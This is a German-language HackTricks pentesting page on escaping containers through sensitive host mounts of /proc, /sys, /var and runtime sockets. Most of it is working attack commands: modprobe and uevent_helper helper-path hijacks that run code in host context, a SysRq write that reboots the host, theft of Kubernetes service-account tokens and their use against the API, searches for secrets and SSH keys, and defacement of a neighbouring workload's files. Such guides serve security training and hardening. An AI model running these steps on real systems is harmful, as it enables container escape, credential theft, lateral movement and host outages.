# Sensible Host-Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Übersicht

Host-Mounts sind eine der wichtigsten praktischen container-escape-Oberflächen, weil sie häufig eine sorgfältig isolierte Prozesssicht wieder in direkte Sichtbarkeit von Host-Ressourcen zurückführen. Die gefährlichen Fälle beschränken sich nicht auf `/`. Bind-Mounts von `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state oder gerätebezogenen Pfaden können Kernel-Steuerungen, Anmeldeinformationen, Dateisysteme benachbarter Container und Laufzeit-Managementschnittstellen exponieren.

Diese Seite existiert separat von den einzelnen Schutzseiten, weil das Missbrauchsmodell bereichsübergreifend ist. Ein beschreibbarer Host-Mount ist gefährlich, teilweise wegen mount namespaces, teilweise wegen user namespaces, teilweise wegen AppArmor- oder SELinux-Abdeckung und teilweise wegen des genau exponierten Host-Pfads. Die Behandlung als eigenes Thema macht die attack surface deutlich leichter zu durchdenken.

## `/proc`-Offenlegung

procfs enthält sowohl gewöhnliche Prozessinformationen als auch hochwirksame Kernel-Steuerungsinterfaces. Ein Bind-Mount wie `-v /proc:/host/proc` oder eine Container-Ansicht, die unerwartete beschreibbare proc-Einträge exponiert, kann daher zu Informationsoffenlegung, Denial-of-Service oder direkter Host-Code-Ausführung führen.

Besonders wertvolle procfs-Pfade umfassen:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Missbrauch

Beginnen Sie damit zu prüfen, welche besonders wertvollen procfs-Einträge sichtbar oder beschreibbar sind:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Diese Pfade sind aus verschiedenen Gründen interessant. `core_pattern`, `modprobe` und `binfmt_misc` können, wenn beschreibbar, zu host code-execution paths werden. `kallsyms`, `kmsg`, `kcore` und `config.gz` sind mächtige reconnaissance sources für kernel exploitation. `sched_debug` und `mountinfo` offenbaren Prozess-, cgroup- und Dateisystem-Kontext, der helfen kann, das host layout von innen heraus aus dem container zu rekonstruieren.

Der praktische Wert der einzelnen Pfade ist unterschiedlich, und alle so zu behandeln, als hätten sie denselben Impact, erschwert die triage:

- `/proc/sys/kernel/core_pattern`  
  Wenn beschreibbar, ist dies einer der höchst wirkenden procfs-Pfade, weil der kernel nach einem Crash einen pipe handler ausführt. Ein container, der `core_pattern` auf eine Payload zeigen kann, die in seinem overlay oder in einem gemounteten host-Pfad gespeichert ist, kann oft host code execution erlangen. Siehe auch [read-only-paths.md](protections/read-only-paths.md) für ein dediziertes Beispiel.
- `/proc/sys/kernel/modprobe`  
  Dieser Pfad steuert den userspace helper, den der kernel nutzt, wenn er module-loading logic aufrufen muss. Wenn er vom container aus beschreibbar und im host-Kontext interpretiert wird, kann er zu einer weiteren host code-execution primitive werden. Besonders interessant in Kombination mit einer Möglichkeit, den helper path auszulösen.
- `/proc/sys/vm/panic_on_oom`  
  Dies ist normalerweise keine saubere escape primitive, kann aber memory pressure in einen host-weiten denial of service verwandeln, indem OOM-Zustände in kernel panic-Verhalten überführt werden.
- `/proc/sys/fs/binfmt_misc`  
  Wenn die registration interface beschreibbar ist, kann der Angreifer einen handler für einen gewählten magic value registrieren und host-context execution erhalten, wenn eine passende Datei ausgeführt wird.
- `/proc/config.gz`  
  Nützlich für kernel exploit triage. Hilft festzustellen, welche Subsysteme, mitigations und optionale kernel features aktiviert sind, ohne Host-Paket-Metadaten zu benötigen.
- `/proc/sysrq-trigger`  
  Meist ein denial-of-service-Pfad, aber ein sehr ernstzunehmender. Er kann den Host sofort rebooten, panic auslösen oder sonstwie stören.
- `/proc/kmsg`  
  Reveals kernel ring buffer messages. Nützlich für host fingerprinting, crash analysis und in einigen Umgebungen für leaking von Informationen, die bei kernel exploitation helfen.
- `/proc/kallsyms`  
  Wertvoll, wenn lesbar, weil es exportierte kernel symbol informationen offenlegt und helfen kann, address randomization assumptions während der Entwicklung von kernel exploits zu unterlaufen.
- `/proc/[pid]/mem`  
  Dies ist eine direkte process-memory-Schnittstelle. Wenn der Zielprozess mit den nötigen ptrace-style Bedingungen erreichbar ist, kann sie das Lesen oder Modifizieren des Speichers eines anderen Prozesses erlauben. Der realistische Impact hängt stark von credentials, `hidepid`, Yama und ptrace-Einschränkungen ab, daher ist es ein mächtiger, aber bedingter Pfad.
- `/proc/kcore`  
  Stellt eine core-image-artige Ansicht des Systemspeichers dar. Die Datei ist riesig und unhandlich zu nutzen, aber wenn sie aussagekräftig lesbar ist, deutet das auf eine stark freigelegte host memory surface hin.
- `/proc/kmem` and `/proc/mem`  
  Historisch hochwirksame raw memory interfaces. Auf vielen modernen Systemen sind sie deaktiviert oder stark eingeschränkt, aber wenn vorhanden und nutzbar, sollten sie als critical findings behandelt werden.
- `/proc/sched_debug`  
  Leaks scheduling und task information, die host process identities offenbaren können, selbst wenn andere Prozessansichten sauberer aussehen als erwartet.
- `/proc/[pid]/mountinfo`  
  Extrem nützlich, um zu rekonstruieren, wo der container wirklich auf dem host liegt, welche Pfade overlay-backed sind und ob ein beschreibbarer Mount host content entspricht oder nur dem container-Layer.

Wenn `/proc/[pid]/mountinfo` oder Overlay-Details lesbar sind, nutze sie, um den host-Pfad des container-Dateisystems wiederherzustellen:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Diese Befehle sind nützlich, weil mehrere host-execution-Tricks erfordern, einen Pfad innerhalb des Containers in den entsprechenden Pfad aus Sicht des Hosts umzuwandeln.

### Vollständiges Beispiel: `modprobe` Helper Path Abuse

Wenn `/proc/sys/kernel/modprobe` vom Container beschreibbar ist und der helper path im Host-Kontext interpretiert wird, kann er auf eine vom Angreifer kontrollierte payload umgeleitet werden:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Der genaue Auslöser hängt vom Ziel und dem kernel-Verhalten ab; wichtig ist jedoch, dass ein writable helper path eine zukünftige kernel helper invocation auf attacker-controlled host-path content umleiten kann.

### Full Example: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

Wenn das Ziel eher eine exploitability assessment als ein sofortiger escape ist:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Diese Befehle helfen zu klären, ob nützliche Symbolinformationen sichtbar sind, ob aktuelle Kernel-Meldungen interessanten Zustand offenbaren und welche Kernel-Funktionen oder -Mitigationsmaßnahmen eingebaut sind. Die Auswirkung ist in der Regel kein direkter Escape, kann aber die Triage von Kernel-Schwachstellen deutlich verkürzen.

### Vollständiges Beispiel: SysRq Host Reboot

Wenn `/proc/sysrq-trigger` beschreibbar ist und die Host-Ansicht erreicht:
```bash
echo b > /proc/sysrq-trigger
```
Die Folge ist ein sofortiger Neustart des Hosts. Dies ist kein subtiler Fall, aber er demonstriert deutlich, dass eine procfs-Offenlegung weit ernster sein kann als information disclosure.

## `/sys` Offenlegung

sysfs gibt große Mengen an Kernel- und Gerätezustand preis. Einige sysfs-Pfade sind hauptsächlich für fingerprinting nützlich, während andere die Ausführung von Helfern, das Geräteverhalten, die Konfiguration von Security-Modulen oder den Firmware-Zustand beeinflussen können.

Wertvolle sysfs-Pfade umfassen:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Diese Pfade sind aus unterschiedlichen Gründen relevant. `/sys/class/thermal` kann das Verhalten der Thermalverwaltung beeinflussen und damit in schlecht exponierten Umgebungen die Stabilität des Hosts beeinträchtigen. `/sys/kernel/vmcoreinfo` kann crash-dump- und kernel-layout-Informationen leak, die beim low-level host fingerprinting helfen. `/sys/kernel/security` ist die `securityfs`-Schnittstelle, die von Linux Security Modules verwendet wird, weshalb unerwarteter Zugriff dort MAC-bezogenen Zustand offenlegen oder verändern kann. EFI-Variable-Pfade können firmware-unterstützte Boot-Einstellungen beeinflussen, wodurch sie viel ernster sind als gewöhnliche Konfigurationsdateien. `debugfs` unter `/sys/kernel/debug` ist besonders gefährlich, weil es bewusst eine entwicklerorientierte Schnittstelle ist, die deutlich weniger Sicherheitsannahmen hat als gehärtete, produktionsorientierte Kernel-APIs.

Nützliche Befehle zur Überprüfung dieser Pfade sind:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
What makes those commands interesting:

- `/sys/kernel/security` kann offenbaren, ob AppArmor, SELinux oder eine andere LSM-Oberfläche in einer Weise sichtbar ist, die eigentlich host-intern hätte bleiben sollen.
- `/sys/kernel/debug` ist oft der alarmierendste Fund in dieser Gruppe. Wenn `debugfs` gemountet und lesbar oder beschreibbar ist, ist mit einer breiten kernelgerichteten Angriffsfläche zu rechnen, deren konkretes Risiko von den aktivierten Debug-Knoten abhängt.
- EFI variable exposure ist seltener, aber wenn vorhanden von hoher Tragweite, weil es firmware-gesicherte Einstellungen betrifft und nicht gewöhnliche Laufzeitdateien.
- `/sys/class/thermal` ist hauptsächlich relevant für die Stabilität des Hosts und die Hardware-Interaktion, nicht für elegante shell-ähnliche Escapes.
- `/sys/kernel/vmcoreinfo` ist hauptsächlich eine Quelle für Host-Fingerprinting und Crash-Analyse, nützlich zum Verständnis des Kernel-Zustands auf niedriger Ebene.

### Vollständiges Beispiel: `uevent_helper`

Wenn `/sys/kernel/uevent_helper` beschreibbar ist, kann der Kernel einen vom Angreifer kontrollierten Helper ausführen, wenn ein `uevent` ausgelöst wird:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Der Grund, warum das funktioniert, ist, dass der helper-Pfad aus Sicht des Hosts interpretiert wird. Sobald er ausgelöst wird, läuft der helper im Host-Kontext statt innerhalb des aktuellen Containers.

## Exposition von `/var`

Das Mounten des Host-`/var` in einen Container wird oft unterschätzt, weil es nicht so dramatisch wirkt wie das Mounten von `/`. In der Praxis kann es jedoch ausreichen, um Laufzeit-Sockets, Container-Snapshot-Verzeichnisse, kubelet-verwaltete Pod-Volumes, projizierte service-account tokens und Dateisysteme benachbarter Anwendungen zu erreichen. Auf modernen Nodes ist `/var` oft der Ort, an dem der betrieblich interessanteste Containerzustand gespeichert ist.

### Kubernetes-Beispiel

Ein Pod mit `hostPath: /var` kann oft die projizierten Tokens anderer Pods und Overlay-Snapshot-Inhalte lesen:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Diese Befehle sind nützlich, weil sie klären, ob der mount nur banale Anwendungsdaten oder hochkritische Cluster-Zugangsdaten offenlegt. Ein lesbares service-account token kann lokale code execution sofort in Zugriff auf die Kubernetes API verwandeln.

Wenn das token vorhanden ist, prüfe, was es erreichen kann, anstatt bei token discovery aufzuhören:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Die Auswirkungen können hier weit über den Zugriff auf den lokalen Node hinausgehen. Ein token mit weitreichenden RBAC-Rechten kann ein gemountetes `/var` in eine cluster-weite Kompromittierung verwandeln.

### Docker And containerd Example

Auf Docker-Hosts befinden sich die relevanten Daten häufig unter `/var/lib/docker`, während sie auf containerd-gestützten Kubernetes-Nodes unter `/var/lib/containerd` oder snapshotter-spezifischen Pfaden liegen können:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Wenn das gemountete `/var` beschreibbare Snapshot-Inhalte einer anderen workload offenlegt, könnte ein Angreifer Anwendungsdateien ändern, Webinhalte einpflanzen oder Startskripte verändern, ohne die current container configuration zu berühren.

Konkrete Missbrauchsideen, sobald beschreibbare Snapshot-Inhalte gefunden wurden:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Diese Befehle sind nützlich, weil sie die drei Hauptauswirkungsbereiche des gemounteten `/var` aufzeigen: Anwendungsmanipulation, Auslesen von Geheimnissen und laterale Bewegung in benachbarte Workloads.

## Laufzeit-Sockets

Empfindliche Host-Mounts beinhalten oft Laufzeit-Sockets statt kompletter Verzeichnisse. Diese sind so wichtig, dass sie hier ausdrücklich wiederholt werden:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Siehe [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) für vollständige exploitation flows, sobald einer dieser sockets gemountet ist.

Als schnelles erstes Interaktionsmuster:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Wenn einer davon gelingt, ist der Weg von "mounted socket" zu "start a more privileged sibling container" normalerweise viel kürzer als jeder Kernel-Breakout-Pfad.

## Mount-bezogene CVEs

Host-Mounts überschneiden sich auch mit Runtime-Schwachstellen. Wichtige aktuelle Beispiele sind:

- `CVE-2024-21626` in `runc`, bei dem ein leaked directory file descriptor das Arbeitsverzeichnis auf dem Host-Dateisystem platzieren konnte.
- `CVE-2024-23651` und `CVE-2024-23653` in BuildKit, bei denen OverlayFS copy-up races während Builds zu Schreibvorgängen auf Host-Pfade führen konnten.
- `CVE-2024-1753` in Buildah und Podman build flows, bei dem während des Builds gefertigte bind mounts `/` als read-write offenlegen konnten.
- `CVE-2024-40635` in containerd, bei dem ein großer `User`-Wert in UID 0-Verhalten überlaufen konnte.

Diese CVEs sind hier relevant, weil sie zeigen, dass die Handhabung von Mounts nicht nur eine Frage der Operator-Konfiguration ist. Die Runtime selbst kann ebenfalls mount-getriebene Escape-Bedingungen einführen.

## Prüfungen

Verwende diese Befehle, um die Mount-Expositionen mit dem höchsten Wert schnell zu lokalisieren:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Was hier interessant ist:

- Der Root des Hosts, `/proc`, `/sys`, `/var` und Runtime-Sockets sind allesamt hochprioritäre Funde.
- Beschreibbare `/proc`-/`/sys`-Einträge bedeuten oft, dass das Mount hostweite Kernel-Kontrollen freigibt, statt einer sicheren Container-Ansicht.
- Gemountete `/var`-Pfade verdienen eine Überprüfung der Zugangsdaten und benachbarter Workloads, nicht nur eine Dateisystem-Überprüfung.
{{#include ../../../banners/hacktricks-training.md}}
